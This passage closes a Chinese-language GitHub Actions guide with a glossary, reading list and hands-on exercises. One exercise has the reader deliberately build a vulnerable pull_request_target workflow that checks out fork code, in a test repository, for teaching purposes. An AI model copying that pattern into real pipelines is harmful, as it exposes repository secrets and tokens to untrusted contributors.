| 表达式 | Expression | `${{ }}` 内的求值语法，支持函数与状态函数 | 6.5 |
| 步骤输出 | Step output | 通过 `$GITHUB_OUTPUT` 文件传给后续 step 的值 | 6.6 |
| 环境文件 | Env file | `$GITHUB_ENV` / `$GITHUB_PATH` 等，跨 step 生效的临时文件机制 | 6.6 |
| 步骤摘要 | Step summary | 写进 `$GITHUB_STEP_SUMMARY` 的 Markdown，显示在运行页面 | 6.6 |
| 矩阵 | Matrix | 一组参数笛卡尔积展开成多个并行 job，上限 256 | 6.3 |
| 依赖图 | needs / DAG | 用 `needs` 声明 job 前后关系，无依赖则并行 | 6.3 |
| 并发组 | Concurrency | 同组运行互斥，可选取消进行中的旧运行 | 6.2 |
| 安装访问令牌 | GITHUB_TOKEN | 每 job 签发的 GitHub App 安装令牌，job 结束即失效 | 8.1 |
| 权限声明 | permissions | 显式声明 token 的 scope；列出一个则其余全为 none | 8.2 |
| 密钥 | Secrets | 加密存储的敏感值，日志中自动打码 | 8.3 |
| 变量 | Variables | 非敏感的仓库/组织级配置值 | 8.3 |
| 环境 | Environment | 部署目标，支持审批人、等待时间、环境级密钥 | 8.3 |
| 开放身份连接 | OIDC | 用短期 JWT 换取云厂商临时凭证，免长期密钥 | 8.4 |
| 可信发布 | Trusted Publishing | 用 OIDC 免密钥发布到 PyPI / npm | 8.4 |
| 请求攻击 | pwn request | `pull_request_target` + checkout fork 代码导致泄密 | 8.5 |
| 模板注入 | Script injection | 把不可信内容直接插进 `run` 脚本导致命令执行 | 8.5 |
| 缓存 | Cache | 加速用的可丢弃数据，key 匹配 + 前缀回退 | 9.1 |
| 产物 | Artifact | 需要保存/传递的构建结果，v4 起不可变 | 9.1 |
| 可复用工作流 | Reusable workflow | 把整个 job 封装供其他 workflow 调用，最多嵌套 10 层 | 10.9 |
| 复合动作 | Composite action | 把一串 step 封装成一个 `uses:` 单元 | 7.1, 10.9 |
| 不可变发布 | Immutable release | 发布后 tag 不可移动、assets 不可修改 | 10.5 |
| 制品证明 | Attestation | 为产物生成可验证的来源证明，用 `gh attestation verify` 校验 | 8.4 |

---

## 十四、延伸阅读

### 官方文档（权威来源）

- **[GitHub Actions 文档](https://docs.github.com/en/actions)** —— 一切的起点，特别是这几页：
  - [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) —— 字段完整参考
  - [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows) —— 所有事件与过滤器的精确语义
  - [Expressions](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions) —— 上下文、运算符、函数
  - [Usage limits](https://docs.github.com/en/actions/reference/limits) —— 限额表
  - [Security hardening](https://docs.github.com/en/actions/reference/security/secure-use) —— 安全实践
  - [OIDC](https://docs.github.com/en/actions/reference/security/oidc) —— 免密钥上云的完整流程

### 源码与实现

- **[actions/runner](https://github.com/actions/runner)** —— runner 本身的实现。想看 5.2 节的加密细节，去读 `src/Runner.Listener/MessageListener.cs` 和 `RSAEncryptedFileKeyManager`
- **[actions/runner-images](https://github.com/actions/runner-images)** —— 每个镜像预装了哪些工具的权威清单，找 `images/ubuntu/Ubuntu2404-Readme.md`
- **[actions/checkout](https://github.com/actions/checkout)** / **[actions/cache](https://github.com/actions/cache)** —— 官方 action 的 README 通常比文档更早更新
- **[actions/artifact](https://github.com/actions/toolkit)** —— 9.3 节讲的 Blob 上传路径在 `packages/artifact/src/internal/` 下

### 工具

- **[actionlint](https://github.com/rhysd/actionlint)** —— workflow 静态检查，建议加进 CI
- **[zizmor](https://github.com/woodruffw/zizmor)** —— 安全审计，能发现模板注入和过度权限
- **[act](https://github.com/nektos/act)** —— 本地运行 workflow
- **[Dependabot](https://docs.github.com/en/code-security/dependabot)** —— 自动升级 pin 到 SHA 的 action

### 延伸阅读（本知识库）

- [[frp-nginx-networking-guide]] —— 本篇 10.4 节的 self-hosted runner 部署方案，与本知识库现有的 frp + Nginx 架构直接衔接
- [[msvc-dll-import-export]] —— 如果把 CI 用于 Windows C++ 项目的构建，DLL 导入导出是常踩的坑

### 动手实验

1. 在任意仓库加一个只 `echo` 的 workflow，确认它能在 push 后被触发
2. 故意把 YAML 缩进改错，观察"workflow 不启动"时 UI 上的提示在哪里
3. 用 `paths:` 过滤，验证"只改 doc/ 时前端构建不触发"
4. 在两个 job 之间用 `outputs` 传一个值，再用 artifact 传一个文件，体会两者的差异
5. 写一个 `pull_request_target` 的 workflow 并**故意 checkout fork 代码**，观察 token 权限是被如何限制的（在安全的测试仓库里做）
6. 给一个部署 workflow 加上 `environment` + Required reviewers，体会审批流程
7. 用 `act -l` 在本地列出 workflow，再用 `act push` 跑一次最简单的那个




